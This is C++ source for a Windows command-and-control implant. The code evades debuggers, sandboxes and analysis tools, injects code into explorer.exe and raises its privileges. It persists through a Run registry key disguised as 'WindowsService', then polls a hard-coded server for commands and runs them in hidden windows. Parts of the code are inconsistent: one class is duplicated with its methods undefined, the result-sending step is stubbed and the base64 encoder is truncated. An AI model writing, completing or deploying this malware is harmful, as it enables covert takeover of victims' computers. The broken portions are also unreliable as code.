#include <windows.h>
#include <winhttp.h>
#include <tlhelp32.h>
#include <vector>
#include <string>
#include <thread>
#include <mutex>
#include <random>
#include <sstream>
#include <iostream>
#include <chrono>
#include <functional>

#pragma comment(lib, "winhttp.lib")

// Utility: XOR Encryption/Decryption
class CryptoUtils {
private:
    std::string xor_encrypt_decrypt(const std::string& data, const std::string& key) {
        std::string result(data);
        for (size_t i = 0; i < data.size(); ++i) {
            result[i] ^= key[i % key.size()];
        }
        return result;
    }

public:
    std::string encrypt(const std::string& data, const std::string& key) {
        return xor_encrypt_decrypt(data, key);
    }

    std::string decrypt(const std::string& data, const std::string& key) {
        return xor_encrypt_decrypt(data, key);
    }
};

// Stealth Utilities
class StealthUtils {
public:
    // Check if running in a debugger
    static bool is_debugger_present() noexcept {
        return IsDebuggerPresent() != FALSE;
    }

    // Check for sandbox-like environments
    static bool is_sandbox() noexcept {
        SYSTEM_INFO sysInfo;
        GetSystemInfo(&sysInfo);

        return sysInfo.dwNumberOfProcessors < 2 || GetTickCount() < 1000;
    }

    // Inject code into another process
    static bool inject_into_process(const std::string& payload, const std::string& target_process = "explorer.exe") {
        PROCESSENTRY32 entry = { sizeof(PROCESSENTRY32) };
        HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

        if (snapshot == INVALID_HANDLE_VALUE)
            return false;

        if (!Process32First(snapshot, &entry)) {
            CloseHandle(snapshot);
            return false;
        }

        do {
            if (target_process == entry.szExeFile) {
                HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, entry.th32ProcessID);
                if (hProcess) {
                    void* mem = VirtualAllocEx(hProcess, nullptr, payload.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
                    if (mem) {
                        if (WriteProcessMemory(hProcess, mem, payload.c_str(), payload.size(), nullptr)) {
                            HANDLE hThread = CreateRemoteThread(hProcess, nullptr, 0, (LPTHREAD_START_ROUTINE)mem, nullptr, 0, nullptr);
                            if (hThread) {
                                CloseHandle(hThread);
                                CloseHandle(hProcess);
                                CloseHandle(snapshot);
                                return true;
                            }
                        }
                        VirtualFreeEx(hProcess, mem, 0, MEM_RELEASE);
                    }
                    CloseHandle(hProcess);
                }
            }
        } while (Process32Next(snapshot, &entry));

        CloseHandle(snapshot);
        return false;
    }
};

// Command Execution
class CommandExecutor {
  public:
    bool elevate_privileges() {
        HANDLE hToken;
        TOKEN_PRIVILEGES tkp;
        
        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
            return false;
            
        LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tkp.Privileges[0].Luid);
        tkp.PrivilegeCount = 1;
        tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        
        return AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, NULL, 0);
    }

    std::string execute(const std::string& cmd) {
        HANDLE hRead, hWrite;
        SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), nullptr, TRUE };
        if (!CreatePipe(&hRead, &hWrite, &sa, 0)) return "Pipe creation failed.";

        STARTUPINFOA si = { sizeof(STARTUPINFOA) };
        si.dwFlags = STARTF_USESTDHANDLES;
        si.hStdOutput = hWrite;
        si.hStdError = hWrite;

        PROCESS_INFORMATION pi = {};
        if (!CreateProcessA(nullptr, const_cast<char*>(cmd.c_str()), nullptr, nullptr, TRUE, CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
            CloseHandle(hRead);
            CloseHandle(hWrite);
            return "Command execution failed.";
        }

        CloseHandle(hWrite);
        std::string output;
        char buffer[128];
        DWORD bytesRead;
        while (ReadFile(hRead, buffer, sizeof(buffer) - 1, &bytesRead, nullptr)) {
            buffer[bytesRead] = '\0';
            output += buffer;
        }

        CloseHandle(hRead);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return output.empty() ? "No output." : output;
    }
};

static std::string base64_encode(const std::string& input) {
    static const std::string base64_chars = 
        "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        "abcdefghijklmnopqrstuvwxyz"
        "0123456789+/";
    
    std::string ret;
    int i = 0;
    unsigned char char_array_3[3];
    unsigned char char_array_4[4];
    
    for (char c : input) {
        char_array_3[i++] = c;
        if (i == 3) {
            char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
            char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
            char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
            char_array_4[3] = char_array_3[2] & 0x3f;
            
            for(i = 0; i < 4; i++)
                ret += base64_chars[char_array_4[i]];
            i = 0;
        }
    }
    return ret;
}

class C2server {
private:
    std::string encrypted_url = "192.168.1.37:8080";
    std::string encryption_key;
    CommandExecutor executor;
    CryptoUtils crypto;
    std::mutex mtx;

    // Existing private methods...
    FARPROC resolve_api(const char* module, const char* function);
    void sleep_with_jitter(int min_ms, int max_ms);
    std::string http_get(const std::wstring& path);
    
    std::string generate_unique_id() {
        SYSTEM_INFO sysInfo;
        GetSystemInfo(&sysInfo);
        char computerName[MAX_COMPUTERNAME_LENGTH + 1];
        DWORD size = sizeof(computerName);
        GetComputerNameA(computerName, &size);
        
        std::stringstream ss;
        ss << computerName << "_" << sysInfo.dwProcessorType;
        return crypto.encrypt(ss.str(), encryption_key);
    }
    
    bool send_response(const std::string& data) {
        std::string encoded = base64_encode(data);
        return !http_get(L"/response/" + std::wstring(encoded.begin(), encoded.end())).empty();
    }
    
    bool establish_persistence() {
        char path[MAX_PATH];
        GetModuleFileNameA(NULL, path, MAX_PATH);
        
        HKEY hkey;
        RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hkey, NULL);
        
        return RegSetValueExA(hkey, "WindowsService", 0, REG_SZ, 
            (BYTE*)path, strlen(path)) == ERROR_SUCCESS;
    }

public:
    C2server() {
        encryption_key = "ghostintheshell"; // Add your encryption key
        encrypted_url = crypto.decrypt(encrypted_url, encryption_key);
    }

    void beacon();
};

// C2 Communication Class
class C2Channel {
private:
    std::string encrypted_url = "192.168.1.37:8080"; // Replace with actual encrypted server URL
    std::string encryption_key = "ghostintheshell";
    CommandExecutor executor;
    CryptoUtils crypto;
    std::mutex mtx;

    // Dynamic API resolution
    FARPROC resolve_api(const char* module, const char* function) {
        HMODULE hModule = LoadLibraryA(module);
        return hModule ? GetProcAddress(hModule, function) : nullptr;
    }

    // Sleep with jitter
    void sleep_with_jitter(int min_ms, int max_ms) {
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dis(min_ms, max_ms);
        std::this_thread::sleep_for(std::chrono::milliseconds(dis(gen)));
    }

    // HTTP GET request
    std::string http_get(const std::wstring& path) {
        std::lock_guard<std::mutex> lock(mtx);

        typedef HINTERNET (WINAPI *WinHttpOpenFunc)(LPCWSTR, DWORD, LPCWSTR, LPCWSTR, DWORD);
        typedef HINTERNET (WINAPI *WinHttpConnectFunc)(HINTERNET, LPCWSTR, INTERNET_PORT, DWORD);
        typedef HINTERNET (WINAPI *WinHttpOpenRequestFunc)(HINTERNET, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR*, DWORD);
        typedef BOOL (WINAPI *WinHttpSendRequestFunc)(HINTERNET, LPCWSTR, DWORD, LPVOID, DWORD, DWORD, DWORD_PTR);
        typedef BOOL (WINAPI *WinHttpReceiveResponseFunc)(HINTERNET, LPVOID);
        typedef BOOL (WINAPI *WinHttpQueryDataAvailableFunc)(HINTERNET, LPDWORD);
        typedef BOOL (WINAPI *WinHttpReadDataFunc)(HINTERNET, LPVOID, DWORD, LPDWORD);
        typedef BOOL (WINAPI *WinHttpCloseHandleFunc)(HINTERNET);

        auto WinHttpOpenPtr = (WinHttpOpenFunc)resolve_api("winhttp.dll", "WinHttpOpen");
        auto WinHttpConnectPtr = (WinHttpConnectFunc)resolve_api("winhttp.dll", "WinHttpConnect");
        auto WinHttpOpenRequestPtr = (WinHttpOpenRequestFunc)resolve_api("winhttp.dll", "WinHttpOpenRequest");
        auto WinHttpSendRequestPtr = (WinHttpSendRequestFunc)resolve_api("winhttp.dll", "WinHttpSendRequest");
        auto WinHttpReceiveResponsePtr = (WinHttpReceiveResponseFunc)resolve_api("winhttp.dll", "WinHttpReceiveResponse");
        auto WinHttpQueryDataAvailablePtr = (WinHttpQueryDataAvailableFunc)resolve_api("winhttp.dll", "WinHttpQueryDataAvailable");
        auto WinHttpReadDataPtr = (WinHttpReadDataFunc)resolve_api("winhttp.dll", "WinHttpReadData");
        auto WinHttpCloseHandlePtr = (WinHttpCloseHandleFunc)resolve_api("winhttp.dll", "WinHttpCloseHandle");

        HINTERNET hSession = WinHttpOpenPtr(L"User-Agent", WINHTTP_ACCESS_TYPE_NO_PROXY, nullptr, nullptr, 0);
        if (!hSession) return "";

        HINTERNET hConnect = WinHttpConnectPtr(hSession, L"192.168.1.37", INTERNET_DEFAULT_HTTP_PORT, 0);
        if (!hConnect) {
            WinHttpCloseHandlePtr(hSession);
            return "";
        }

        HINTERNET hRequest = WinHttpOpenRequestPtr(hConnect, L"GET", path.c_str(), nullptr, nullptr, nullptr, 0);
        if (!hRequest) {
            WinHttpCloseHandlePtr(hConnect);
            WinHttpCloseHandlePtr(hSession);
            return "";
        }

        std::string response;
        if (WinHttpSendRequestPtr(hRequest, nullptr, 0, nullptr, 0, 0, 0) &&
            WinHttpReceiveResponsePtr(hRequest, nullptr)) {
            DWORD bytesAvailable = 0;
            WinHttpQueryDataAvailablePtr(hRequest, &bytesAvailable);
            if (bytesAvailable > 0) {
                std::vector<char> buffer(bytesAvailable + 1);
                DWORD bytesRead;
                WinHttpReadDataPtr(hRequest, buffer.data(), bytesAvailable, &bytesRead);
                buffer[bytesRead] = '\0';
                response = std::string(buffer.data());
            }
        }

        WinHttpCloseHandlePtr(hRequest);
        WinHttpCloseHandlePtr(hConnect);
        WinHttpCloseHandlePtr(hSession);
        return response;
    }

public:
    C2Channel() {
        // Decrypt URL during runtime
        CryptoUtils crypto;
        encrypted_url = crypto.decrypt(encrypted_url, encryption_key);
    }

    void beacon() {
        if (StealthUtils::is_debugger_present() || StealthUtils::is_sandbox()) {
            exit(0);
        }

        while (true) {
            std::string command = http_get(L"/get_command");
            if (!command.empty()) {
                std::string decrypted_cmd = crypto.decrypt(command, encryption_key);
                std::string result = executor.execute(decrypted_cmd);
                std::string encrypted_result = crypto.encrypt(result, encryption_key);
                http_get(L"/send_response");  // Simulate sending response
            }
            sleep_with_jitter(5000, 20000);  // Longer jitter for stealth
        }
    }
};

// Entry Point
int main() {
    VirtualProtect(GetModuleHandle(NULL), 0x1000, 
        PAGE_EXECUTE_READWRITE, new DWORD{0});

    C2Channel c2;
    c2.beacon();
    return 0;
}

// Add to StealthUtils
static bool is_analysis_tool() {
    const char* blacklist[] = {"wireshark", "procmon", "fiddler", "ida", "ollydbg"};
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    
    if (Process32First(snapshot, &entry)) {
        do {
            for (const auto& tool : blacklist) {
                if (strstr(entry.szExeFile, tool)) return true;
            }
        } while (Process32Next(snapshot, &entry));
    }
    CloseHandle(snapshot);
    return false;
}

